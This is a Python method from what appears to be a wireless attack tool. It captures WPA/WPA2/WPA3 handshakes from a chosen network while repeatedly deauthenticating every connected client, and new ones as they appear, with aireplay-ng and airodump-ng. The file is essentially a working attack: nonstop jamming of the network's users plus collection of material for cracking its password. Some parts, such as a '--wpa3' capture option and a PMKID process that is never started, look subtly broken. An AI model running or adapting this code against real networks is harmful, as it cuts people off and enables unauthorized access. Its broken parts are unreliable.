
import os
import shutil
import time
from scapy.all import *
from rich.table import Table
from rich.live import Live
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import subprocess
from pathlib import Path
import concurrent.futures


def capture_handshake(self):
    """Captures WPA/WPA2/WPA3 handshake"""
    if not self.selected_network:
        self.console.print("[bold red]Please select a target network first![/]")
        return

    network = self.networks[self.selected_network]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Create directories in application directory
    tmp_dir = Path("tmp")
    handshake_dir = Path("handshake")
    tmp_dir.mkdir(exist_ok=True)
    handshake_dir.mkdir(exist_ok=True)
    
    output_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}"
    handshake_found = False
    dump_proc = None
    pmkid_proc = None
    start_time = time.time()
    
    # Initialize client tracking
    known_clients = set(network['clients'])
    last_client_check = time.time()
    client_check_interval = 5  # Check for new clients every 5 seconds
    
    # Create a thread lock for client set manipulation
    client_lock = threading.Lock()
    
    # Check security type
    is_wpa3 = False
    if 'cipher' in network:
        if "WPA3" in network['cipher']:
            is_wpa3 = True
    
    if is_wpa3:
        self.console.print("[bold blue]WPA3 network detected. Using specialized capture method...[/]")
        self.logger.info(f"WPA3 handshake capture started for {network['ssid']}")

    # Display important information to the user
    self.console.print("\n[bold yellow]Important Information:[/]")
    self.console.print("[bold cyan]- Handshake capture will continue until you press Ctrl+C")
    self.console.print("[bold cyan]- If a handshake is found, it will be saved but the process will continue")
    self.console.print("[bold cyan]- Any new clients connecting to the network will be automatically targeted")
    self.console.print("[bold cyan]- All clients will be deauthenticated simultaneously\n")

    def create_status_table():
        """Creates and updates status table with current information"""
        current_time = time.time()
        elapsed_time = int(current_time - start_time)
        
        hours = elapsed_time // 3600
        minutes = (elapsed_time % 3600) // 60
        seconds = elapsed_time % 60
        elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
        # Create main table
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("BSSID", style="cyan")
        table.add_column("Channel", style="green")
        table.add_column("ESSID", style="yellow")
        table.add_column("Clients", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Time Elapsed", style="yellow")
        table.add_column("Security", style="magenta")

        with client_lock:
            status = "[bold green]✓ Handshake Found! (Continuing...)" if handshake_found else "[bold yellow]Capturing..."
            security = "[bold cyan]WPA3" if is_wpa3 else "[bold yellow]WPA/WPA2"
            table.add_row(
                self.selected_network,
                str(network['channel']),
                network['ssid'],
                str(len(known_clients)),
                status,
                elapsed_str,
                security
            )

        return table
        
    # Function to deauthenticate a single client
    def deauth_client(client_mac):
        try:
            deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {client_mac} {self.interface_name}"
            subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            return True
        except Exception as e:
            self.logger.error(f"Error deauthenticating client {client_mac}: {str(e)}")
            return False
            
    # Function to deauthenticate all clients in parallel
    def deauth_all_clients():
        with client_lock:
            clients_list = list(known_clients)
            
        # Use thread pool to deauth clients in parallel
        with ThreadPoolExecutor(max_workers=min(10, len(clients_list) + 1)) as executor:
            # Submit deauth tasks for all clients
            client_futures = {executor.submit(deauth_client, client): client for client in clients_list}
            
            # Also submit broadcast deauth
            broadcast_cmd = f"aireplay-ng -0 2 -a {self.selected_network} {self.interface_name}"
            broadcast_future = executor.submit(lambda: subprocess.run(broadcast_cmd.split(), 
                                                                    stdout=subprocess.DEVNULL, 
                                                                    stderr=subprocess.DEVNULL))
            
            # Wait for all tasks to complete
            for future in concurrent.futures.as_completed(client_futures):
                client = client_futures[future]
                try:
                    success = future.result()
                    if not success:
                        self.logger.warning(f"Failed to deauth client: {client}")
                except Exception as e:
                    self.logger.error(f"Exception deauthing client {client}: {str(e)}")
            
            # Check broadcast result
            try:
                broadcast_future.result()
            except Exception as e:
                self.logger.error(f"Exception during broadcast deauth: {str(e)}")
    
    # Function to check for new clients connected to the network
    def check_for_new_clients():
        nonlocal last_client_check
        current_time = time.time()
        
        # Only check periodically to avoid excessive processing
        if current_time - last_client_check < client_check_interval:
            return
            
        last_client_check = current_time
        
        # Get latest network information
        with self._networks_lock:
            if self.selected_network in self.networks:
                current_clients = set(self.networks[self.selected_network]['clients'])
                
                # Check for new clients
                with client_lock:
                    new_clients = current_clients - known_clients
                    if new_clients:
                        self.console.print(f"[bold green]Detected {len(new_clients)} new clients! Targeting them...[/]")
                        for new_client in new_clients:
                            self.logger.info(f"New client detected: {new_client}")
                        known_clients.update(new_clients)

    # Function to check for captured handshake
    def check_for_handshake():
        nonlocal handshake_found
        
        if handshake_found:
            return True
            
        cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
        if not cap_files:
            return False
            
        found = False
        
        if is_wpa3:
            # For WPA3, check differently as aircrack might not report handshake properly
            try:
                result = subprocess.run(["wpaclean", "check_temp.cap", str(cap_files[0])], 
                                        capture_output=True, text=True)
                found = "handshake" in result.stdout.lower() or os.path.getsize("check_temp.cap") > 24
                if os.path.exists("check_temp.cap"):
                    os.remove("check_temp.cap")
            except:
                # Fallback to standard check if wpaclean isn't available
                result = subprocess.run(["aircrack-ng", str(cap_files[0])], capture_output=True, text=True)
                found = "1 handshake" in result.stdout
        else:
            # Standard WPA/WPA2 check
            result = subprocess.run(["aircrack-ng", str(cap_files[0])], capture_output=True, text=True)
            found = "1 handshake" in result.stdout
            
        if found and not handshake_found:
            # First time finding handshake
            handshake_found = True
            
            # Save the handshake file
            final_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
            shutil.move(str(cap_files[0]), str(final_file))
            security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
            
            self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_file}[/]")
            self.console.print("[bold yellow]Continuing capture process for additional handshakes... Press Ctrl+C to stop.[/]")
            self.logger.info(f"{security_type} handshake captured and saved to {final_file}")
            
            # Return True to indicate a handshake was found (but we continue)
            return True
            
        return found

    try:
        with Live(refresh_per_second=4) as live:
            # Start listening with airodump-ng with specialized options for WPA3 if needed
            base_cmd = f"airodump-ng -c {network['channel']} --bssid {self.selected_network} -w {output_file}"
            if is_wpa3:
                # Add WPA3-specific options
                dump_cmd = f"{base_cmd} --wpa3 {self.interface_name}"
            else:
                dump_cmd = f"{base_cmd} {self.interface_name}"
                
            dump_proc = subprocess.Popen(dump_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Main capture loop - continues until Ctrl+C is pressed
            while True:
                # Update status display
                live.update(create_status_table())
                live.refresh()

                # Check for new clients
                check_for_new_clients()

                # Deauth all clients in parallel
                deauth_all_clients()

                # Check for handshake
                check_for_handshake()  # Note: We don't break even if handshake is found
                    
                # Small sleep to prevent high CPU usage
                time.sleep(0.25)

    except KeyboardInterrupt:
        if handshake_found:
            self.console.print("\n[bold green]Handshake capture process stopped by user. Handshake was already captured successfully![/]")
        else:
            self.console.print("\n[bold yellow]Handshake capture operation stopped by user. No handshake was captured.[/]")
    except Exception as e:
        self.console.print(f"\n[bold red]Error: {str(e)}[/]")
        self.logger.error(f"Error in handshake capture: {str(e)}")
    finally:
        # Cleanup processes
        if dump_proc:
            try:
                dump_proc.terminate()
                dump_proc.wait(timeout=2)
            except:
                try:
                    dump_proc.kill()
                    dump_proc.wait(timeout=1)
                except:
                    pass
                
        if pmkid_proc:
            try:
                # Send SIGTERM followed by SIGKILL
                pmkid_proc.terminate()  # SIGTERM
                try:
                    pmkid_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    pmkid_proc.kill()   # SIGKILL
                    try:
                        pmkid_proc.wait(timeout=2)
                    except:
                        pass
            except:
                # As a last resort, use pkill directly
                try:
                    subprocess.run(["pkill", "-9", "-f", f"hcxdumptool.*{self.selected_network}"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
        
        # Clean temporary files
        for ext in [".csv", ".netxml", "-01.cap"]:
            for f in handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*{ext}"):
                try:
                    f.unlink()
                except:
                    pass
        
        security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
        self.logger.info(f"{security_type} handshake capture completed: {'Successful' if handshake_found else 'Failed'}")
        # Ensure menu state is properly reset
        self.current_menu = "attack"